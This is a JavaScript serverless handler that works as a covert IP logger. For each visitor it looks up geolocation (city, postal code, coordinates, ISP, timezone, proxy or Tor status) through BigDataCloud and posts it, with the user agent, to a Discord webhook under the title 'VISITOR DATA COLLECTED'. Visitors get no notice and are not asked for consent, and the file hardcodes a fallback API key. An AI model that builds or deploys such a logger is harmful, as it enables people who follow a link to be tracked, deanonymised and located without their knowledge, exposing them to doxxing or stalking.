export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // Get client IP
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Clean the IP address
    if (clientIP.includes(',')) {
      clientIP = clientIP.split(',')[0].trim();
    }
    
    // Remove IPv6 prefix if present
    clientIP = clientIP.replace(/^::ffff:/, '');
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'bdc_6f1f8e9b1cfc419fa4ddb55f5a16a8b7'; // Demo key
    
    console.log(`Processing IP: ${clientIP}`);
    console.log(`Using API Key: ${apiKey ? 'Set' : 'Not set'}`);

    // ========== FETCH BIGDATACLOUD DATA ==========
    
    let ipData = {};
    let timezoneData = {};
    let threatData = {};
    
    try {
      // First, let's use the client IP API to get location
      console.log('Fetching client IP info...');
      const clientIPResponse = await fetch('https://api.bigdatacloud.net/data/client-ip');
      
      if (clientIPResponse.ok) {
        const clientData = await clientIPResponse.json();
        console.log('Client IP data:', JSON.stringify(clientData, null, 2));
      }
      
      // Use the correct endpoint: ip-geolocation-with-confidence
      console.log('Fetching IP geolocation...');
      const geoResponse = await fetch(
        `https://api.bigdatacloud.net/data/ip-geolocation-with-confidence?ip=${clientIP}&localityLanguage=en&key=${apiKey}`
      );
      
      console.log('Geo Response status:', geoResponse.status);
      
      if (geoResponse.ok) {
        ipData = await geoResponse.json();
        console.log('IP Data received:', JSON.stringify(ipData, null, 2));
      } else {
        const errorText = await geoResponse.text();
        console.log('Geo API error:', errorText);
        
        // Fallback to basic IP info
        const fallbackResponse = await fetch(`https://api.bigdatacloud.net/data/ip-geolocation?ip=${clientIP}&localityLanguage=en&key=${apiKey}`);
        if (fallbackResponse.ok) {
          ipData = await fallbackResponse.json();
          console.log('Fallback IP data received');
        }
      }
      
      // Get timezone data if we have coordinates
      if (ipData.location && ipData.location.latitude) {
        console.log('Fetching timezone...');
        const tzResponse = await fetch(
          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${ipData.location.latitude}&longitude=${ipData.location.longitude}&localityLanguage=en&key=${apiKey}`
        );
        
        if (tzResponse.ok) {
          timezoneData = await tzResponse.json();
          console.log('Timezone data received');
        }
      }
      
      // Get threat data
      console.log('Fetching threat data...');
      const threatResponse = await fetch(
        `https://api.bigdatacloud.net/data/reverse-ip?ip=${clientIP}&key=${apiKey}`
      );
      
      if (threatResponse.ok) {
        threatData = await threatResponse.json();
        console.log('Threat data received');
      }
      
    } catch (apiError) {
      console.error('BigDataCloud API Error:', apiError.message);
      console.error('Stack:', apiError.stack);
    }

    // ========== PROCESS AND STRUCTURE DATA ==========
    
    const structuredData = {
      // Basic info
      ip: clientIP,
      userAgent: userAgent,
      timestamp: new Date().toISOString(),
      
      // Location data
      location: {
        city: ipData?.location?.city || 'Unknown',
        region: ipData?.location?.region || 'Unknown',
        country: ipData?.country?.name || 'Unknown',
        countryCode: ipData?.country?.isoAlpha2 || 'Unknown',
        latitude: ipData?.location?.latitude || 0,
        longitude: ipData?.location?.longitude || 0,
        postalCode: ipData?.location?.postalCode || 'Unknown',
        continent: ipData?.continent?.name || 'Unknown',
        continentCode: ipData?.continent?.code || 'Unknown'
      },
      
      // Network data
      network: {
        isp: ipData?.network?.carrier?.name || 'Unknown',
        organization: ipData?.network?.organisation || 'Unknown',
        asn: ipData?.network?.autonomousSystemNumber || 'Unknown',
        asnName: ipData?.network?.autonomousSystemOrganization || 'Unknown',
        connectionType: ipData?.network?.connectionType || 'Unknown',
        carrierName: ipData?.network?.carrier?.mcc || 'Unknown'
      },
      
      // Timezone data
      timezone: {
        name: timezoneData?.ianaTimeZone || 'Unknown',
        localTime: timezoneData?.localTime || new Date().toISOString(),
        gmtOffset: timezoneData?.gmtOffset || 0,
        gmtOffsetString: timezoneData?.gmtOffsetString || '+00:00',
        isDaylightSaving: timezoneData?.isDaylightSaving || false
      },
      
      // Threat data
      threat: {
        isProxy: threatData?.isProxy || false,
        isTorExitNode: threatData?.isTorExitNode || false,
        isHostingProvider: threatData?.isHostingProvider || false,
        isPublicProxy: threatData?.isPublicProxy || false,
        isResidentialProxy: threatData?.isResidentialProxy || false,
        confidence: threatData?.confidence || 0
      },
      
      // Device info
      device: parseUserAgent(userAgent),
      
      // Additional metadata
      metadata: {
        accuracyRadius: ipData?.location?.accuracyRadius || 'Unknown',
        lastUpdated: ipData?.lastUpdated || new Date().toISOString(),
        callingCode: ipData?.country?.callingCode || 'Unknown',
        isEU: ipData?.country?.isEU || false,
        currency: ipData?.country?.currency?.code || 'Unknown'
      }
    };

    // ========== SEND TO DISCORD ==========
    
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await sendToDiscord(structuredData);
        console.log('Data sent to Discord successfully');
      } catch (discordError) {
        console.error('Discord webhook error:', discordError.message);
      }
    }

    // ========== RETURN RESPONSE ==========
    
    res.status(200).json({
      success: true,
      message: "IP data collected successfully",
      data: structuredData,
      rawData: ipData // Include raw data for debugging
    });

  } catch (error) {
    console.error('Server Error:', error);
    res.status(200).json({
      success: false,
      error: error.message,
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    });
  }
}

// ========== HELPER FUNCTIONS ==========

function parseUserAgent(userAgent) {
  const ua = userAgent || '';
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Desktop';
  
  // Browser detection
  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari')) browser = 'Safari';
  else if (ua.includes('Edge')) browser = 'Edge';
  else if (ua.includes('Opera')) browser = 'Opera';
  
  // OS detection
  if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac')) os = 'Mac OS';
  else if (ua.includes('Linux')) os = 'Linux';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
  
  // Device detection
  if (ua.includes('Mobile')) device = 'Mobile';
  else if (ua.includes('Tablet')) device = 'Tablet';
  
  return {
    browser,
    os,
    device,
    raw: ua.substring(0, 200) + (ua.length > 200 ? '...' : '')
  };
}

async function sendToDiscord(data) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  
  if (!webhookURL) {
    console.log('No Discord webhook URL set');
    return;
  }
  
  // Create Discord embed
  const embed = {
    embeds: [{
      title: "🌐 VISITOR DATA COLLECTED",
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: [
        {
          name: "📍 IP ADDRESS",
          value: `\`\`\`${data.ip}\`\`\``,
          inline: false
        },
        {
          name: "🌍 LOCATION",
          value: `**Country:** ${data.location.country} (${data.location.countryCode})\n**Region:** ${data.location.region}\n**City:** ${data.location.city}\n**Postal Code:** ${data.location.postalCode}`,
          inline: true
        },
        {
          name: "📡 NETWORK",
          value: `**ISP:** ${data.network.isp}\n**Organization:** ${data.network.organization}\n**ASN:** ${data.network.asn}`,
          inline: true
        },
        {
          name: "🕒 TIMEZONE",
          value: `**Zone:** ${data.timezone.name}\n**Local Time:** ${new Date(data.timezone.localTime).toLocaleString()}\n**Offset:** ${data.timezone.gmtOffsetString}`,
          inline: true
        },
        {
          name: "📊 COORDINATES",
          value: `**Latitude:** ${data.location.latitude}\n**Longitude:** ${data.location.longitude}\n**Accuracy:** ${data.metadata.accuracyRadius} km`,
          inline: true
        },
        {
          name: "🖥️ DEVICE",
          value: `**Browser:** ${data.device.browser}\n**OS:** ${data.device.os}\n**Device:** ${data.device.device}`,
          inline: true
        },
        {
          name: "⚠️ THREAT STATUS",
          value: getThreatStatus(data.threat),
          inline: true
        },
        {
          name: "📄 USER AGENT",
          value: `\`\`\`${data.device.raw}\`\`\``,
          inline: false
        },
        {
          name: "📊 ADDITIONAL INFO",
          value: `**Continent:** ${data.location.continent}\n**Calling Code:** +${data.metadata.callingCode}\n**Currency:** ${data.metadata.currency}\n**EU Member:** ${data.metadata.isEU ? 'Yes' : 'No'}`,
          inline: true
        }
      ],
      footer: {
        text: "BigDataCloud IP Logger • Data Collected"
      }
    }]
  };
  
  // Send to Discord
  try {
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(embed)
    });
    
    if (!response.ok) {
      console.log('Discord response:', response.status, response.statusText);
    }
    
  } catch (error) {
    console.error('Failed to send to Discord:', error.message);
  }
}

function getThreatStatus(threat) {
  const threats = [];
  
  if (threat.isProxy) threats.push("Proxy");
  if (threat.isTorExitNode) threats.push("Tor Exit Node");
  if (threat.isHostingProvider) threats.push("Hosting Provider");
  if (threat.isPublicProxy) threats.push("Public Proxy");
  if (threat.isResidentialProxy) threats.push("Residential Proxy");
  
  if (threats.length === 0) {
    return "✅ Clean - No threats detected";
  }
  
  return `⚠️ **Potential Threats:** ${threats.join(', ')}\n**Confidence:** ${threat.confidence}%`;
}
